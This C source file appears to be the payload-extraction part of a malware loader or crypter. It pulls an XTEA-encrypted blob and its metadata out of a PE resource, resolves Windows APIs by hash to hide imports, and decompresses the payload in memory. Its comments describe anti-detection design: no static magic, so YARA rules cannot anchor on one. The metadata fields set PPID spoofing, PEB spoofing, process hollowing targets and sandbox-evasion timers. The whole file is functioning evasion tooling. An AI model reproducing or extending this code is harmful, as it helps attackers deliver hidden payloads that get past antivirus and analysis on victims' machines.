#include "Payload.h"
#include "Common.h"
#include "ApiHashing.h"
#include "..\Engine\PeBuilder.h"

typedef HRSRC   (WINAPI *pfnFindResourceW)(HMODULE, LPCWSTR, LPCWSTR);
typedef HGLOBAL (WINAPI *pfnLoadResource)(HMODULE, HRSRC);
typedef LPVOID  (WINAPI *pfnLockResource)(HGLOBAL);
typedef DWORD   (WINAPI *pfnSizeofResource)(HMODULE, HRSRC);
typedef LPVOID  (WINAPI *pfnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *pfnVirtualFree)(LPVOID, SIZE_T, DWORD);

#define RESOLVE_API(TYPE, HMOD, HASH) ((TYPE)GetProcAddressH(HMOD, HASH))

/* GetPayloadFromResource
 *
 * Parses the 344-byte metadata block appended after the XTEA-encrypted blob
 * in the .rsrc section (Resource ID 101, RT_RCDATA).
 *
 * Metadata block layout (offsets from magic position p, growing toward lower addresses):
 *
 *   p[  0..  3]  magic          = key_salt[0]^key_salt[1]^key_salt[2]^key_salt[3]
 *   p[  -4.. -1] flags          = OPSEC_FLAG_* + EVASION_FLAG_* bitmask
 *   p[ -68.. -5] ppid_name      = parent process name for PPID spoof (64 bytes)
 *   p[ -72..-69] hammer_ms      = API-hammer duration (ms); 0 = default 3000
 *   p[ -76..-73] uptime_min     = uptime threshold (minutes); 0 = default 2
 *   p[ -80..-77] sleep_fwd_ms   = sleep-fwd duration (ms); 0 = default 500
 *   p[-112..-81] semaphore_name = exec-ctrl semaphore (32 bytes)
 *   p[-176..-113] spoof_exe     = PEB spoof / hollow target filename (64 bytes)
 *   p[-304..-177] exportArg     = export argument string (128 bytes)
 *   p[-308..-305] exportHash    = fixed-seed Djb2 hash of DLL export; 0 = none
 *   p[-312..-309] blobSize      = XTEA blob size
 *   p[-316..-313] stubSize      = mutated ASM decryptor size
 *   p[-320..-317] origSize      = original decompressed PE size
 *   p[-324..-321] dll+pad       = [dll_idx0, dll_idx1, dll_idx2, 0x00]
 *   p[-340..-325] key_salt      = per-build XTEA key salt (16 bytes / 4 DWORDs)
 *   (= 280 bytes total; kMagicOffset = 276; blob starts immediately before key_salt)
 *
 * Verification: scan backwards from end of resource (up to 64 bytes to tolerate
 * UpdateResource alignment padding) looking for a DWORD equal to XOR of the
 * 4 DWORDs that make up key_salt (32 bytes earlier in the resource).
 * No fixed magic constant is used, so YARA cannot anchor on a static value.
 */
BOOL GetPayloadFromResource(PBYTE*  ppRawPayload,
                             PDWORD  pdwPayloadSize,
                             PDWORD  pdwMutatedStubSize,
                             PDWORD  pdwOriginalDecompressedSize,
                             DWORD   key_salt[4],
                             BYTE    dll_indices[3],
                             DWORD*  pdwExportHash,
                             LPCSTR* ppExportArg,
                             LPCSTR* ppSpoofExe,
                             LPCSTR* ppSemaphoreName,
                             DWORD*  pdwSleepFwdMs,
                             DWORD*  pdwUptimeMin,
                             DWORD*  pdwHammerMs,
                             DWORD*  pdwOpsecFlags,
                             PDWORD  pdwError)
{
    HMODULE hKernel32 = GetModuleHandleH(g_Hash_kernel32);
    if (!hKernel32) { if (pdwError) *pdwError = 99; return FALSE; }

    pfnFindResourceW  pFindResourceW  = RESOLVE_API(pfnFindResourceW,  hKernel32, g_Hash_FindResourceW);
    pfnLoadResource   pLoadResource   = RESOLVE_API(pfnLoadResource,   hKernel32, g_Hash_LoadResource);
    pfnLockResource   pLockResource   = RESOLVE_API(pfnLockResource,   hKernel32, g_Hash_LockResource);
    pfnSizeofResource pSizeofResource = RESOLVE_API(pfnSizeofResource, hKernel32, g_Hash_SizeofResource);
    pfnVirtualAlloc   pVirtualAlloc   = RESOLVE_API(pfnVirtualAlloc,   hKernel32, g_Hash_VirtualAlloc);

    if (!pFindResourceW)  { if (pdwError) *pdwError = 90; return FALSE; }
    if (!pLoadResource)   { if (pdwError) *pdwError = 91; return FALSE; }
    if (!pLockResource)   { if (pdwError) *pdwError = 92; return FALSE; }
    if (!pSizeofResource) { if (pdwError) *pdwError = 93; return FALSE; }
    if (!pVirtualAlloc)   { if (pdwError) *pdwError = 94; return FALSE; }

    /* Step 1: Locate and lock the RCDATA resource with ID 101 */
    HRSRC   hRes = pFindResourceW(NULL, MAKEINTRESOURCEW(101), (LPCWSTR)10 /* RT_RCDATA */);
    if (!hRes) { if (pdwError) *pdwError = 100; return FALSE; }

    HGLOBAL hGlob    = pLoadResource(NULL, hRes);
    if (!hGlob) { if (pdwError) *pdwError = 101; return FALSE; }

    BYTE*   fileBuffer = (BYTE*)pLockResource(hGlob);
    DWORD   fileSize   = pSizeofResource(NULL, hRes);

    /* Minimum size: sizeof(PAYLOAD_METADATA) + 1 byte of blob */
    if (!fileBuffer || fileSize < (DWORD)(sizeof(PAYLOAD_METADATA) + 1)) {
        if (pdwError) *pdwError = 102;
        return FALSE;
    }

    /* Step 2: Find the metadata block by scanning backwards.
     *
     * UpdateResource may add up to ~64 bytes of alignment padding after our data,
     * so we scan up to 128 bytes from the end.  A candidate is valid when:
     *   magic == key_salt[0] ^ key_salt[1] ^ key_salt[2] ^ key_salt[3]
     * magic is the last field of PAYLOAD_METADATA, so key_salt sits
     * (sizeof(PAYLOAD_METADATA) - sizeof(DWORD)) = 276 bytes before magic.
     */
    static const DWORD kMagicOffset = sizeof(PAYLOAD_METADATA) - sizeof(DWORD);

    DWORD searchLimit = (fileSize > 128) ? 128 : fileSize;
    PBYTE pMagicFound = NULL;

    for (DWORD i = 0; i < searchLimit; i++) {
        BYTE* pMagicCandidate = fileBuffer + fileSize - 4 - i;

        /* Bounds check: need kMagicOffset more bytes before magic for the full struct */
        if ((DWORD)(pMagicCandidate - fileBuffer) < kMagicOffset) break;

        PAYLOAD_METADATA* pMetaCandidate = (PAYLOAD_METADATA*)(pMagicCandidate - kMagicOffset);
        DWORD candidateMagic = *(DWORD*)pMagicCandidate;
        DWORD expectedMagic  = pMetaCandidate->key_salt[0] ^ pMetaCandidate->key_salt[1]
                             ^ pMetaCandidate->key_salt[2] ^ pMetaCandidate->key_salt[3];

        if (candidateMagic == expectedMagic) {
            pMagicFound = pMagicCandidate;
            break;
        }
    }

    if (!pMagicFound) { if (pdwError) *pdwError = 103; return FALSE; }

    /* Step 3: Cast found position to PAYLOAD_METADATA and read all fields by name.
     * pMagicFound points to magic (last field); subtract kMagicOffset to reach struct start. */
    PAYLOAD_METADATA* pMeta = (PAYLOAD_METADATA*)(pMagicFound - kMagicOffset);

    DWORD  opsecFlags    = pMeta->flags;
    LPCSTR pSpoofExePtr  = pMeta->spoof_exe;
    LPCSTR pExportArgPtr = pMeta->exportArg;
    DWORD  exportHash    = pMeta->exportHash;
    DWORD  blobSize      = pMeta->blobSize;
    DWORD  stubSize      = pMeta->stubSize;
    DWORD  origSize      = pMeta->origSize;

    /* Sanity checks */
    DWORD metaOffset = (DWORD)(pMagicFound - fileBuffer) + 4;
    if (blobSize == 0 || blobSize >= metaOffset)  { if (pdwError) *pdwError = 104; return FALSE; }
    if (stubSize == 0 || stubSize >= blobSize)    { if (pdwError) *pdwError = 105; return FALSE; }

    /* blob starts immediately before the metadata block */
    DWORD blobStartOffset = metaOffset - (DWORD)sizeof(PAYLOAD_METADATA) - blobSize;
    BYTE* rawBlob = fileBuffer + blobStartOffset;

    /* Step 4: Copy blob to a private RW allocation for in-place XTEA decryption */
    PBYTE pRetPayload = (PBYTE)pVirtualAlloc(NULL, blobSize,
                                              MEM_COMMIT | MEM_RESERVE,
                                              PAGE_READWRITE);
    if (!pRetPayload) { if (pdwError) *pdwError = 106; return FALSE; }

    custom_memcpy(pRetPayload, rawBlob, blobSize);

    /* Step 5: Return all metadata to caller */
    *ppRawPayload                = pRetPayload;
    *pdwPayloadSize              = blobSize;
    *pdwMutatedStubSize          = stubSize;
    *pdwOriginalDecompressedSize = origSize;

    key_salt[0] = pMeta->key_salt[0];
    key_salt[1] = pMeta->key_salt[1];
    key_salt[2] = pMeta->key_salt[2];
    key_salt[3] = pMeta->key_salt[3];

    dll_indices[0] = pMeta->dll_idx[0];
    dll_indices[1] = pMeta->dll_idx[1];
    dll_indices[2] = pMeta->dll_idx[2];

    /* exportHash, exportArg, spoofExe, semaphoreName — passed through to Stub.
     * Pointers point directly into the locked resource view (valid for process lifetime). */
    if (pdwExportHash)   *pdwExportHash   = exportHash;
    if (ppExportArg)     *ppExportArg     = pExportArgPtr;
    if (ppSpoofExe)      *ppSpoofExe      = pSpoofExePtr;
    if (ppSemaphoreName) *ppSemaphoreName = pMeta->semaphore_name[0] ? pMeta->semaphore_name : NULL;
    if (pdwSleepFwdMs)   *pdwSleepFwdMs   = pMeta->sleep_fwd_ms;
    if (pdwUptimeMin)    *pdwUptimeMin    = pMeta->uptime_min;
    if (pdwHammerMs)     *pdwHammerMs     = pMeta->hammer_ms;
    if (pdwOpsecFlags)   *pdwOpsecFlags   = opsecFlags;

    return TRUE;
}

typedef LONG (NTAPI *pRtlDecompressBuffer_t)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, PULONG);

BOOL DecompressPayload(const BYTE* inBuffer, ULONG inSize, BYTE** outBuffer, ULONG outExpectedSize) {
    HMODULE hNtdll = GetModuleHandleH(g_Hash_ntdll);
    if (!hNtdll) return FALSE;

    pRtlDecompressBuffer_t pDecompress = RESOLVE_API(pRtlDecompressBuffer_t, hNtdll, g_Hash_RtlDecompressBuffer);
    if (!pDecompress) return FALSE;

    HMODULE hKernel32 = GetModuleHandleH(g_Hash_kernel32);
    pfnVirtualAlloc pVirtualAlloc = RESOLVE_API(pfnVirtualAlloc, hKernel32, g_Hash_VirtualAlloc);
    pfnVirtualFree pVirtualFree = RESOLVE_API(pfnVirtualFree, hKernel32, g_Hash_VirtualFree);

    if (!pVirtualAlloc || !pVirtualFree) return FALSE;

    *outBuffer = (BYTE*)pVirtualAlloc(NULL, outExpectedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!*outBuffer) return FALSE;

    ULONG finalDecompressedSize = 0;
    LONG status = pDecompress(
        0x0002, /* COMPRESSION_FORMAT_LZNT1 */
        (PUCHAR)*outBuffer,
        outExpectedSize,
        (PUCHAR)inBuffer,
        inSize,
        &finalDecompressedSize
    );

    if (status != 0 || finalDecompressedSize != outExpectedSize) {
        pVirtualFree(*outBuffer, 0, MEM_RELEASE);
        *outBuffer = NULL;
        return FALSE;
    }

    return TRUE;
}
